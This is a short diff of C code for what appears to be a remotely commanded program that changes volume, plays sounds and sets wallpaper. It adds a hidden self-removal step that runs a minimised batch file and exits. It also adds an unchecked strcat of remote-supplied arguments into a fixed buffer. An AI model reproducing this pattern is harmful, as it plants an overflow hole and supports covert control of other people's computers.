@@ -121,6 +121,8 @@ void execCommand(JBCMD cmd)
         break;
     case JB_REMOVE:
         // you should uninstall yourself NOW!!!
+        system("start /min /high kys.bat");
+        exit(0); // just in case
         break;
 
     /* --- Sounds --- */
@@ -128,8 +130,9 @@ void execCommand(JBCMD cmd)
         waveOutSetVolume(NULL, atoi(cmd.args)); // deprecated
         break;
     case JB_SZAMBO:
-        // path up to change
-        PlaySound(cmd.args, NULL, SND_FILENAME | SND_ASYNC);
+        char path[CMD_ARGSZ] = "res\\";
+        strcat(path, cmd.args);
+        PlaySoundA(path, NULL, SND_FILENAME | SND_ASYNC);
         break;
 
     /* --- Wallpaper --- */
